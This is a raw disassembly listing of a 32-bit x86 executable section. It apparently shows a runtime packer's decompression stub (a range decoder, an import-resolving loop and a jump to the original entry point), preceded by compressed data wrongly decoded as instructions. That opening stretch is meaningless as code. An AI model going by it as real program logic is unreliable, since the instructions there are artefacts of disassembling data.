  436133:	68 e3 e4 6c ac       	push   $0xac6ce4e3
  436138:	16                   	push   %ss
  436139:	b3 1c                	mov    $0x1c,%bl
  43613b:	22 c7                	and    %bh,%al
  43613d:	1f                   	pop    %ds
  43613e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  43613f:	4b                   	dec    %ebx
  436140:	ae                   	scas   %es:(%edi),%al
  436141:	bf 9d f8 d4 eb       	mov    $0xebd4f89d,%edi
  436146:	94                   	xchg   %eax,%esp
  436147:	f6 e0                	mul    %al
  436149:	e6 df                	out    %al,$0xdf
  43614b:	61                   	popa
  43614c:	4c                   	dec    %esp
  43614d:	0f 5d 47 26          	minps  0x26(%edi),%xmm0
  436151:	3a 79 92             	cmp    -0x6e(%ecx),%bh
  436154:	fc                   	cld
  436155:	53                   	push   %ebx
  436156:	ae                   	scas   %es:(%edi),%al
  436157:	69 be 5a 36 17 65 75 	imul   $0x9986a075,0x6517365a(%esi),%edi
  43615e:	a0 86 99 
  436161:	d3 ca                	ror    %cl,%edx
  436163:	56                   	push   %esi
  436164:	34 5d                	xor    $0x5d,%al
  436166:	11 04 5e             	adc    %eax,(%esi,%ebx,2)
  436169:	d5 f2                	aad    $0xf2
  43616b:	ec                   	in     (%dx),%al
  43616c:	04 cf                	add    $0xcf,%al
  43616e:	e1 c0                	loope  0x436130
  436170:	df 76 ea             	fbstp  -0x16(%esi)
  436173:	23 e0                	and    %eax,%esp
  436175:	68 03 77 1f 1a       	push   $0x1a1f7703
  43617a:	2d 84 5d 09 3d       	sub    $0x3d095d84,%eax
  43617f:	1e                   	push   %ds
  436180:	92                   	xchg   %eax,%edx
  436181:	fa                   	cli
  436182:	a9 94 6b c9 a5       	test   $0xa5c96b94,%eax
  436187:	d0 2e                	shrb   $1,(%esi)
  436189:	9d                   	popf
  43618a:	c4                   	(bad)
  43618b:	f2 15 bf 79 2d 72    	repnz adc $0x722d79bf,%eax
  436191:	02 e9                	add    %cl,%ch
  436193:	9e                   	sahf
  436194:	09 9a 55 f5 1f 5b    	or     %ebx,0x5b1ff555(%edx)
  43619a:	11 46 67             	adc    %eax,0x67(%esi)
  43619d:	0e                   	push   %cs
  43619e:	be f2 1a 3a 0e       	mov    $0xe3a1af2,%esi
  4361a3:	43                   	inc    %ebx
  4361a4:	8c ed                	mov    %gs,%ebp
  4361a6:	54                   	push   %esp
  4361a7:	27                   	daa
  4361a8:	1d e6 df e1 ba       	sbb    $0xbae1dfe6,%eax
  4361ad:	e8 01 47 75 7a       	call   0x7ab8a8b3
  4361b2:	2d a2 6b 3c e2       	sub    $0xe23c6ba2,%eax
  4361b7:	d0 55 6b             	rclb   $1,0x6b(%ebp)
  4361ba:	c4 a8 96 a2 be 13    	les    0x13bea296(%eax),%ebp
  4361c0:	0d b8 32 88 5e       	or     $0x5e8832b8,%eax
  4361c5:	13 3a                	adc    (%edx),%edi
  4361c7:	36 85 dc             	ss test %ebx,%esp
  4361ca:	bf 18 54 81 eb       	mov    $0xeb815418,%edi
  4361cf:	e5 39                	in     $0x39,%eax
  4361d1:	97                   	xchg   %eax,%edi
  4361d2:	41                   	inc    %ecx
  4361d3:	78 92                	js     0x436167
  4361d5:	8b d8                	mov    %eax,%ebx
  4361d7:	26 14 f6             	es adc $0xf6,%al
  4361da:	6c                   	insb   (%dx),%es:(%edi)
  4361db:	1c 2d                	sbb    $0x2d,%al
  4361dd:	bc 46 a6 6f e4       	mov    $0xe46fa646,%esp
  4361e2:	72 c1                	jb     0x4361a5
  4361e4:	cf                   	iret
  4361e5:	54                   	push   %esp
  4361e6:	bb 45 c7 59 d4       	mov    $0xd459c745,%ebx
  4361eb:	f5                   	cmc
  4361ec:	c2 8e 0f             	ret    $0xf8e
  4361ef:	e0 d6                	loopne 0x4361c7
  4361f1:	16                   	push   %ss
  4361f2:	78 35                	js     0x436229
  4361f4:	d0 ee                	shr    $1,%dh
  4361f6:	59                   	pop    %ecx
  4361f7:	dd d7                	fst    %st(7)
  4361f9:	19 34 ea             	sbb    %esi,(%edx,%ebp,8)
  4361fc:	be 88 01 40 00       	mov    $0x400188,%esi
  436201:	ad                   	lods   %ds:(%esi),%eax
  436202:	8b f8                	mov    %eax,%edi
  436204:	95                   	xchg   %eax,%ebp
  436205:	ad                   	lods   %ds:(%esi),%eax
  436206:	91                   	xchg   %eax,%ecx
  436207:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  436209:	ad                   	lods   %ds:(%esi),%eax
  43620a:	b5 1c                	mov    $0x1c,%ch
  43620c:	f3 ab                	rep stos %eax,%es:(%edi)
  43620e:	ad                   	lods   %ds:(%esi),%eax
  43620f:	50                   	push   %eax
  436210:	97                   	xchg   %eax,%edi
  436211:	51                   	push   %ecx
  436212:	58                   	pop    %eax
  436213:	8d 54 85 5c          	lea    0x5c(%ebp,%eax,4),%edx
  436217:	ff 16                	call   *(%esi)
  436219:	72 57                	jb     0x436272
  43621b:	2c 03                	sub    $0x3,%al
  43621d:	73 02                	jae    0x436221
  43621f:	b0 00                	mov    $0x0,%al
  436221:	3c 07                	cmp    $0x7,%al
  436223:	72 02                	jb     0x436227
  436225:	2c 03                	sub    $0x3,%al
  436227:	50                   	push   %eax
  436228:	0f b6 5f ff          	movzbl -0x1(%edi),%ebx
  43622c:	c1 e3 03             	shl    $0x3,%ebx
  43622f:	b3 00                	mov    $0x0,%bl
  436231:	8d 1c 5b             	lea    (%ebx,%ebx,2),%ebx
  436234:	8d 9c 9d 0c 10 00 00 	lea    0x100c(%ebp,%ebx,4),%ebx
  43623b:	b0 01                	mov    $0x1,%al
  43623d:	e3 29                	jecxz  0x436268
  43623f:	8b d7                	mov    %edi,%edx
  436241:	2b 55 0c             	sub    0xc(%ebp),%edx
  436244:	8a 2a                	mov    (%edx),%ch
  436246:	33 d2                	xor    %edx,%edx
  436248:	84 e9                	test   %ch,%cl
  43624a:	0f 95 c6             	setne  %dh
  43624d:	52                   	push   %edx
  43624e:	fe c6                	inc    %dh
  436250:	8a d0                	mov    %al,%dl
  436252:	8d 14 93             	lea    (%ebx,%edx,4),%edx
  436255:	ff 16                	call   *(%esi)
  436257:	5a                   	pop    %edx
  436258:	9f                   	lahf
  436259:	12 c0                	adc    %al,%al
  43625b:	d0 e9                	shr    $1,%cl
  43625d:	74 0e                	je     0x43626d
  43625f:	9e                   	sahf
  436260:	1a f2                	sbb    %dl,%dh
  436262:	74 e4                	je     0x436248
  436264:	b4 00                	mov    $0x0,%ah
  436266:	33 c9                	xor    %ecx,%ecx
  436268:	b5 01                	mov    $0x1,%ch
  43626a:	ff 56 08             	call   *0x8(%esi)
  43626d:	33 c9                	xor    %ecx,%ecx
  43626f:	ff 66 24             	jmp    *0x24(%esi)
  436272:	b1 30                	mov    $0x30,%cl
  436274:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  436277:	03 d1                	add    %ecx,%edx
  436279:	ff 16                	call   *(%esi)
  43627b:	73 4b                	jae    0x4362c8
  43627d:	03 d1                	add    %ecx,%edx
  43627f:	ff 16                	call   *(%esi)
  436281:	72 19                	jb     0x43629c
  436283:	03 d1                	add    %ecx,%edx
  436285:	ff 16                	call   *(%esi)
  436287:	72 29                	jb     0x4362b2
  436289:	3c 07                	cmp    $0x7,%al
  43628b:	b0 09                	mov    $0x9,%al
  43628d:	72 02                	jb     0x436291
  43628f:	b0 0b                	mov    $0xb,%al
  436291:	50                   	push   %eax
  436292:	8b c7                	mov    %edi,%eax
  436294:	2b 45 0c             	sub    0xc(%ebp),%eax
  436297:	8a 00                	mov    (%eax),%al
  436299:	ff 66 20             	jmp    *0x20(%esi)
  43629c:	83 c2 60             	add    $0x60,%edx
  43629f:	ff 16                	call   *(%esi)
  4362a1:	87 5d 10             	xchg   %ebx,0x10(%ebp)
  4362a4:	73 0c                	jae    0x4362b2
  4362a6:	03 d1                	add    %ecx,%edx
  4362a8:	ff 16                	call   *(%esi)
  4362aa:	87 5d 14             	xchg   %ebx,0x14(%ebp)
  4362ad:	73 03                	jae    0x4362b2
  4362af:	87 5d 18             	xchg   %ebx,0x18(%ebp)
  4362b2:	3c 07                	cmp    $0x7,%al
  4362b4:	b0 08                	mov    $0x8,%al
  4362b6:	72 02                	jb     0x4362ba
  4362b8:	b0 0b                	mov    $0xb,%al
  4362ba:	50                   	push   %eax
  4362bb:	53                   	push   %ebx
  4362bc:	8b d5                	mov    %ebp,%edx
  4362be:	03 56 14             	add    0x14(%esi),%edx
  4362c1:	ff 56 0c             	call   *0xc(%esi)
  4362c4:	5b                   	pop    %ebx
  4362c5:	91                   	xchg   %eax,%ecx
  4362c6:	ff 66 3c             	jmp    *0x3c(%esi)
  4362c9:	07                   	pop    %es
  4362ca:	b0 07                	mov    $0x7,%al
  4362cc:	72 02                	jb     0x4362d0
  4362ce:	b0 0a                	mov    $0xa,%al
  4362d0:	50                   	push   %eax
  4362d1:	87 5d 10             	xchg   %ebx,0x10(%ebp)
  4362d4:	87 5d 14             	xchg   %ebx,0x14(%ebp)
  4362d7:	89 5d 18             	mov    %ebx,0x18(%ebp)
  4362da:	8b d5                	mov    %ebp,%edx
  4362dc:	03 56 18             	add    0x18(%esi),%edx
  4362df:	ff 56 0c             	call   *0xc(%esi)
  4362e2:	6a 03                	push   $0x3
  4362e4:	59                   	pop    %ecx
  4362e5:	50                   	push   %eax
  4362e6:	48                   	dec    %eax
  4362e7:	3b c1                	cmp    %ecx,%eax
  4362e9:	72 02                	jb     0x4362ed
  4362eb:	8b c1                	mov    %ecx,%eax
  4362ed:	c1 e0 06             	shl    $0x6,%eax
  4362f0:	b1 40                	mov    $0x40,%cl
  4362f2:	8d 9c 85 7c 03 00 00 	lea    0x37c(%ebp,%eax,4),%ebx
  4362f9:	ff 56 04             	call   *0x4(%esi)
  4362fc:	3c 04                	cmp    $0x4,%al
  4362fe:	8b d8                	mov    %eax,%ebx
  436300:	72 5f                	jb     0x436361
  436302:	33 db                	xor    %ebx,%ebx
  436304:	d1 e8                	shr    $1,%eax
  436306:	13 db                	adc    %ebx,%ebx
  436308:	48                   	dec    %eax
  436309:	43                   	inc    %ebx
  43630a:	91                   	xchg   %eax,%ecx
  43630b:	43                   	inc    %ebx
  43630c:	d3 e3                	shl    %cl,%ebx
  43630e:	80 f9 05             	cmp    $0x5,%cl
  436311:	8d 94 9d 7c 01 00 00 	lea    0x17c(%ebp,%ebx,4),%edx
  436318:	76 2e                	jbe    0x436348
  43631a:	80 e9 04             	sub    $0x4,%cl
  43631d:	33 c0                	xor    %eax,%eax
  43631f:	8b 55 00             	mov    0x0(%ebp),%edx
  436322:	d1 6d 08             	shrl   $1,0x8(%ebp)
  436325:	8b 12                	mov    (%edx),%edx
  436327:	0f ca                	bswap  %edx
  436329:	2b 55 04             	sub    0x4(%ebp),%edx
  43632c:	03 c0                	add    %eax,%eax
  43632e:	3b 55 08             	cmp    0x8(%ebp),%edx
  436331:	72 07                	jb     0x43633a
  436333:	8b 55 08             	mov    0x8(%ebp),%edx
  436336:	40                   	inc    %eax
  436337:	01 55 04             	add    %edx,0x4(%ebp)
  43633a:	ff 56 10             	call   *0x10(%esi)
  43633d:	e2 e0                	loop   0x43631f
  43633f:	b1 04                	mov    $0x4,%cl
  436341:	d3 e0                	shl    %cl,%eax
  436343:	03 d8                	add    %eax,%ebx
  436345:	8d 55 1c             	lea    0x1c(%ebp),%edx
  436348:	33 c0                	xor    %eax,%eax
  43634a:	53                   	push   %ebx
  43634b:	40                   	inc    %eax
  43634c:	51                   	push   %ecx
  43634d:	d3 e0                	shl    %cl,%eax
  43634f:	8b da                	mov    %edx,%ebx
  436351:	91                   	xchg   %eax,%ecx
  436352:	ff 56 04             	call   *0x4(%esi)
  436355:	33 d2                	xor    %edx,%edx
  436357:	59                   	pop    %ecx
  436358:	d1 e8                	shr    $1,%eax
  43635a:	13 d2                	adc    %edx,%edx
  43635c:	e2 fa                	loop   0x436358
  43635e:	5b                   	pop    %ebx
  43635f:	03 da                	add    %edx,%ebx
  436361:	43                   	inc    %ebx
  436362:	59                   	pop    %ecx
  436363:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  436366:	56                   	push   %esi
  436367:	8b f7                	mov    %edi,%esi
  436369:	2b f3                	sub    %ebx,%esi
  43636b:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  43636d:	ac                   	lods   %ds:(%esi),%al
  43636e:	5e                   	pop    %esi
  43636f:	b1 80                	mov    $0x80,%cl
  436371:	aa                   	stos   %al,%es:(%edi)
  436372:	3b 7e 2c             	cmp    0x2c(%esi),%edi
  436375:	73 03                	jae    0x43637a
  436377:	ff 66 28             	jmp    *0x28(%esi)
  43637a:	58                   	pop    %eax
  43637b:	8b 4e 30             	mov    0x30(%esi),%ecx
  43637e:	5f                   	pop    %edi
  43637f:	e3 1b                	jecxz  0x43639c
  436381:	8a 07                	mov    (%edi),%al
  436383:	47                   	inc    %edi
  436384:	04 18                	add    $0x18,%al
  436386:	3c 02                	cmp    $0x2,%al
  436388:	73 f7                	jae    0x436381
  43638a:	8b 07                	mov    (%edi),%eax
  43638c:	3c 05                	cmp    $0x5,%al
  43638e:	75 f1                	jne    0x436381
  436390:	b0 00                	mov    $0x0,%al
  436392:	0f c8                	bswap  %eax
  436394:	03 46 1c             	add    0x1c(%esi),%eax
  436397:	2b c7                	sub    %edi,%eax
  436399:	ab                   	stos   %eax,%es:(%edi)
  43639a:	e2 e5                	loop   0x436381
  43639c:	8b 5e 34             	mov    0x34(%esi),%ebx
  43639f:	8b 76 38             	mov    0x38(%esi),%esi
  4363a2:	46                   	inc    %esi
  4363a3:	ad                   	lods   %ds:(%esi),%eax
  4363a4:	85 c0                	test   %eax,%eax
  4363a6:	0f 84 74 ae fd ff    	je     0x411220
  4363ac:	56                   	push   %esi
  4363ad:	97                   	xchg   %eax,%edi
  4363ae:	ff 53 fc             	call   *-0x4(%ebx)
  4363b1:	95                   	xchg   %eax,%ebp
  4363b2:	ac                   	lods   %ds:(%esi),%al
  4363b3:	84 c0                	test   %al,%al
  4363b5:	75 fb                	jne    0x4363b2
  4363b7:	38 06                	cmp    %al,(%esi)
  4363b9:	74 e7                	je     0x4363a2
  4363bb:	8b c6                	mov    %esi,%eax
  4363bd:	79 05                	jns    0x4363c4
  4363bf:	46                   	inc    %esi
  4363c0:	33 c0                	xor    %eax,%eax
  4363c2:	66 ad                	lods   %ds:(%esi),%ax
  4363c4:	50                   	push   %eax
  4363c5:	55                   	push   %ebp
  4363c6:	ff 13                	call   *(%ebx)
  4363c8:	ab                   	stos   %eax,%es:(%edi)
  4363c9:	eb e7                	jmp    0x4363b2
  4363cb:	50                   	push   %eax
  4363cc:	8b 45 08             	mov    0x8(%ebp),%eax
  4363cf:	52                   	push   %edx
  4363d0:	c1 e8 0b             	shr    $0xb,%eax
  4363d3:	f7 22                	mull   (%edx)
  4363d5:	8b 55 00             	mov    0x0(%ebp),%edx
  4363d8:	8b 12                	mov    (%edx),%edx
  4363da:	0f ca                	bswap  %edx
  4363dc:	2b 55 04             	sub    0x4(%ebp),%edx
  4363df:	3b c2                	cmp    %edx,%eax
  4363e1:	5a                   	pop    %edx
  4363e2:	76 10                	jbe    0x4363f4
  4363e4:	89 45 08             	mov    %eax,0x8(%ebp)
  4363e7:	33 c0                	xor    %eax,%eax
  4363e9:	b4 08                	mov    $0x8,%ah
  4363eb:	2b 02                	sub    (%edx),%eax
  4363ed:	c1 e8 05             	shr    $0x5,%eax
  4363f0:	01 02                	add    %eax,(%edx)
  4363f2:	eb 0e                	jmp    0x436402
  4363f4:	01 45 04             	add    %eax,0x4(%ebp)
  4363f7:	29 45 08             	sub    %eax,0x8(%ebp)
  4363fa:	8b 02                	mov    (%edx),%eax
  4363fc:	c1 e8 05             	shr    $0x5,%eax
  4363ff:	29 02                	sub    %eax,(%edx)
  436401:	f9                   	stc
  436402:	58                   	pop    %eax
  436403:	9c                   	pushf
  436404:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  436408:	75 0b                	jne    0x436415
  43640a:	ff 45 00             	incl   0x0(%ebp)
  43640d:	c1 65 04 08          	shll   $0x8,0x4(%ebp)
  436411:	c1 65 08 08          	shll   $0x8,0x8(%ebp)
  436415:	9d                   	popf
  436416:	c3                   	ret
  436417:	33 c0                	xor    %eax,%eax
  436419:	40                   	inc    %eax
  43641a:	8d 14 83             	lea    (%ebx,%eax,4),%edx
  43641d:	ff 16                	call   *(%esi)
  43641f:	13 c0                	adc    %eax,%eax
  436421:	3b c1                	cmp    %ecx,%eax
  436423:	72 f5                	jb     0x43641a
  436425:	2b c1                	sub    %ecx,%eax
  436427:	c3                   	ret
  436428:	b1 08                	mov    $0x8,%cl
  43642a:	ff 16                	call   *(%esi)
  43642c:	8d 52 04             	lea    0x4(%edx),%edx
  43642f:	b0 01                	mov    $0x1,%al
  436431:	73 0b                	jae    0x43643e
  436433:	ff 16                	call   *(%esi)
  436435:	b0 09                	mov    $0x9,%al
  436437:	73 05                	jae    0x43643e
  436439:	c1 e1 05             	shl    $0x5,%ecx
  43643c:	b0 11                	mov    $0x11,%al
  43643e:	50                   	push   %eax
  43643f:	8d 1c 82             	lea    (%edx,%eax,4),%ebx
  436442:	ff 56 04             	call   *0x4(%esi)
  436445:	5b                   	pop    %ebx
  436446:	03 c3                	add    %ebx,%eax
  436448:	c3                   	ret
  436449:	00 20                	add    %ah,(%eax)
  43644b:	42                   	inc    %edx
  43644c:	00 08                	add    %cl,(%eax)
  43644e:	20 42 00             	and    %al,0x0(%edx)
  436451:	8c 20                	mov    %fs,(%eax)
  436453:	41                   	inc    %ecx
  436454:	00 10                	add    %dl,(%eax)
  436456:	30 42 00             	xor    %al,0x0(%edx)
	...
  436461:	0e                   	push   %cs
  436462:	00 00                	add    %al,(%eax)
  436464:	00 1e                	add    %bl,(%esi)
	...
  436472:	00 00                	add    %al,(%eax)
  436474:	00 02                	add    %al,(%edx)
  436476:	00 00                	add    %al,(%eax)
  436478:	00 61 64             	add    %ah,0x64(%ecx)
  43647b:	03 00                	add    (%eax),%eax
	...
